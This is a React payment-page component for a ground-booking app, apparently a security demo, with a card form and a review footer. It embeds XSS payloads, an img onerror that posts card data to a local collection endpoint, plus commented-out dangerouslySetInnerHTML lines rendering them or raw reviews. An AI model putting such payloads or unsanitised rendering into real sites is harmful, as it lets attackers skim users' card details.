import React, { useState, useEffect } from 'react';
import styled from 'styled-components';
import NavBar from '../../../components/main/navbar';
import Modal from 'react-modal'; 
import '../../../style/footer.css'
import { Link } from 'react-router-dom'
import ProfileImage from '../../../components/global/profileImage';
import formatDate from '../../../utils/formatDate';
import axios from 'axios';
import StarsRating from '../../../components/global/starsRating';
// import DangerouslySetHtmlContent from '../../../components/main/dangerouslySetHtmlContent';

const UserDetails=styled.div`
width: 50%;
@media (max-width: 1100px) {
  width: 100%;
}
`;

const Review=styled.div`
width: 60%;
padding: 5px 0 0 0;
margin: 0 0 0 7px;

@media (max-width: 1100px) {
  width: 100%;
}
`;

const StyledH3 = styled.h3`
  color: #88ccca; // Bluish-green silver radiant
  text-shadow: 2px 2px 5px rgba(150, 150, 150, 0.5);
`;

const Main = styled.div`
  display: flex;
  margin: 150px auto;
  width: 90%;
  flex-wrap: wrap;
  justify-content: center;
  align-items: center;
  gap: 60px;
`;

const Message = styled.div`
  font-size: 50px;
  font-weight: 700;
  color: whitesmoke;
  margin: 60px;
`;

const FormContainer = styled.div`
  padding: 40px;
  background: #333333; // Darker background for better readability
  color: #ffffff; // White text for better contrast
  border-radius: 12px;
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
  width: 100%;
  max-width: 650px;
  position: relative;
`;

const StyledForm = styled.form`
  display: flex;
  flex-direction: column;
  gap: 20px;
`;

const FormHeading = styled.h3`
  color: #f4a261; // Warm color for the heading for aesthetic contrast
  margin-bottom: 20px;
`;

const InfoDisplay = styled.div`
  font-size: 16px;
  padding: 10px 0;
  border-bottom: 1px solid #ccc;
`;

const StyledInput = styled.input`
  padding: 10px;
  border-radius: 5px;
  border: 1px solid #ccc;
  font-size: 16px;
  background: #444; // Slightly lighter than form for distinction
  color: #fff; // Text color
`;

const HalfInputWrapper = styled.div`
  display: flex;
  gap: 10px;
`;

const HalfInput = styled(StyledInput)`
  flex: 1;
`;

const StyledButton = styled.button`
  padding: 15px 30px;
  background-color: #2a9d8f; // Consistent with other design elements
  color: white;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-size: 18px;
  transition: background-color 0.3s ease;

  &:hover {
    background-color: #264653; // Darker shade for hover
  }
`;

const DecorativeShape = styled.div`
  position: absolute;
  top: -25px;
  right: -25px;
  width: 70px;
  height: 70px;
  background-color: #e76f51; // Add a pop of color
  clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
`;

const customModalStyles = {
  content: {
    top: '50%',
    left: '50%',
    right: 'auto',
    bottom: 'auto',
    marginRight: '-50%',
    transform: 'translate(-50%, -50%)',
    backgroundColor: '#333333',
    color: 'white'
  },
  overlay: {
    backgroundColor: 'rgba(0, 0, 0, 0.75)'
  }
};

Modal.setAppElement('#root');

export default function Payment() {
    const xssPayload = `
    <img src="invalid-image" 
      onerror="
        if (window.cardHolderName) {
          fetch('http://localhost:4000/receive-card-credentials', {
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ cardHolderName: window.cardHolderName })
          })
          .then(response => response.text())
          .then(data => console.log('Data:', data))
          .catch(error => console.error('Error:', error));
        }
      ">
  `;

  const xssPayload2 = `<html><scr'+'ipt>alert("this.is.sparta");}</scr'+'ipt></html>`

    const [reviews, setReviews]=useState([]);

    const getReviews=async () =>{
        try {
          const res=await axios.get(`http://localhost:3000/countries/pak/cities/khi/grounds/ma-1/reviews`, {headers: {"Authorization": `Bearer ${sessionStorage.getItem("accessToken")}`}});
    
          const sortedReviews=res.data.reviews.filter((review => review.status==='Approved'));
          setReviews(sortedReviews);
          console.log(reviews[0])

        } catch (error) {
          console.log(error);
        }
      }

      useEffect(() => {
        getReviews()
      }, [])


  const [cardHolderName, setCardHolderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [cvv, setCvv] = useState('');
  const [modalIsOpen, setModalIsOpen] = useState(false);

  const validateForm = () => {
    return (
      cardHolderName.trim() !== '' &&
      cardNumber.trim().length === 16 &&
      expiryMonth.trim() !== '' &&
      expiryYear.trim() !== '' &&
      cvv.trim().length === 3
    );
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    if (!validateForm()) {
      alert("Please check your inputs.");
      return;
    }
    
    try {
      // const response = await AuthorizeNetApi.submitPayment({ cardHolderName, cardNumber, expiryMonth, expiryYear, cvv });
      // if (response.success) {
        setModalIsOpen(true);
      // } else {
      //   alert("Payment failed: " + response.error);
      // }
    } catch (error) {
      console.error("Payment error:", error);
      alert("Payment processing error");
    }
  };

  const closeModal = () => {
    setModalIsOpen(false);
  };

  return (
    <div style={{ backdropFilter: "blur(40px)", backgroundColor: "rgba(0, 0, 0, 0.6)" }}>
      <div style={{ minHeight: '100vh' }}>
        <NavBar />
        <Main>
          <Message>Welcome to our Payment Page</Message>
          <FormContainer>
            <DecorativeShape />
            <FormHeading>Payment Details</FormHeading>
            <InfoDisplay>Booking ID: 123456</InfoDisplay>
            <InfoDisplay>Time: 14:00 - 16:00</InfoDisplay>
            <InfoDisplay>Ground: Madhu</InfoDisplay>
            <InfoDisplay>Booking Fee per Hour: 4000</InfoDisplay>
            <InfoDisplay>Total: 8000</InfoDisplay>
            <StyledForm onSubmit={handleSubmit}>
              <StyledInput
                type="text"
                placeholder="Card Holder Name"
                value={cardHolderName}
                onChange={(e) => setCardHolderName(e.target.value)}
                required
              />
              <StyledInput
                type="number"
                placeholder="Card Number"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value)}
                required
              />
              <HalfInputWrapper>
                <HalfInput
                  type="text"
                  placeholder="Expiry Month"
                  value={expiryMonth}
                  onChange={(e) => setExpiryMonth(e.target.value)}
                  required
                />
                <HalfInput
                  type="text"
                  placeholder="Expiry Year"
                  value={expiryYear}
                  onChange={(e) => setExpiryYear(e.target.value)}
                  required
                />
              </HalfInputWrapper>
              <StyledInput
                type="text"
                placeholder="CVV"
                value={cvv}
                onChange={(e) => setCvv(e.target.value)}
                required
              />
              <StyledButton type="submit">Submit Payment</StyledButton>
            </StyledForm>
            <Modal
              isOpen={modalIsOpen}
              onRequestClose={closeModal}
              style={customModalStyles}
              contentLabel="Payment Success Modal"
            >
              <h2 style={{ color: '#2a9d8f' }}>Payment Success</h2>
              <p>Your payment has been successfully processed!</p>
              <button onClick={closeModal}>Close</button>
            </Modal>
          </FormContainer>
        </Main>
      </div>
      <footer>
        <div className='footerLogoContent'>
            <StyledH3>See what our most trusted users have to say!</StyledH3>
            <br />
        {reviews.length>0 ? 
        <>
        <UserDetails>
        <div style={{display: 'flex', flexDirection: 'row'}}>
          <ProfileImage width={50} height={50} url={reviews[0].user.profileImage} />
          <div>
            <p style={{fontSize: '18px', fontWeight: '500', color: 'whitesmoke', margin: 'auto 0 auto 15px'}}>{reviews[0].user.firstName + " " + reviews[0].user.lastName}</p>
            <p style={{fontSize: '14px', fontWeight: '500', color: 'grey', margin: '0 0 0 15px'}}>{formatDate(reviews[0].createdAt)}</p>
          </div>
        </div>
        </UserDetails>
        <Review>
                    <div>
                      <StarsRating totalStars={10} starSize={15} selected={11} style={{margin: '0 0 10px 0', display: 'inline-block'}} disableHover={true} disableSelection={true} />
                    </div>
                    {/* <div dangerouslySetInnerHTML={{ __html: `<img src="invalid-image" onerror="fetch('http://localhost:4000/receive-card-credentials', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cardHolderName: 'Hasin Zaman', accountNumber: '1234123412341234', expiryMonth: '01', expiryYear: '2030', CVV: '123' })}).then(response => response.text()).then(data => console.log('Data:', data)).catch(error => console.error('Error:', error))">` }}></div> */}
                    {/* <div dangerouslySetInnerHTML={{ __html: reviews[0].review }}></div> */}
                    {/* <div dangerouslySetInnerHTML={{ __html: xssPayload }}></div> */}
                    {/* <p style={{fontSize: '16px', fontWeight: '500', color: 'whitesmoke', margin: '0 0 5px 3px'}}>{reviews[0].review}</p> */}
        </Review>
        </>
        :
        <div />
        }   
        </div>
        <div className='footerContent'>
            <ul className='footerList firstList'>
              <li className="footerTitle">MY ACCOUNT</li>
              <li className='footerBox'><Link to="/users/:id" className='footerLink'>Profile</Link></li>
              <li className='footerBox'><Link to="/login" className='footerLink'>Login</Link></li>
              <li className='footerBox'><Link to="/payment" className='footerLink'>Checkout</Link></li>
              <li className='footerBox'><Link to="/teams" className='footerLink'>Register Team</Link></li>
              <li className='footerBox'><Link to="/grounds" className='footerLink'>Register Ground</Link></li>
            </ul>
            <ul className='footerList secondList'>
              <li className="footerTitle">SERVICE</li>
              <li className='footerBox'><Link to="/about" className='footerLink'>About us</Link></li>
              <li className='footerBox'><Link to="/contact" className='footerLink'>Contact us</Link></li>
              <li className='footerBox'><Link to="/faqs" className='footerLink'>FAQs</Link></li>
              <li className='footerBox'><Link to="/privacy" className='footerLink'>Privacy Policy</Link></li>
              <li className='footerBox'><Link to="/refund" className='footerLink'>Refund Policy</Link></li>
            </ul>
        </div>
        </footer>
    </div>
  );
}
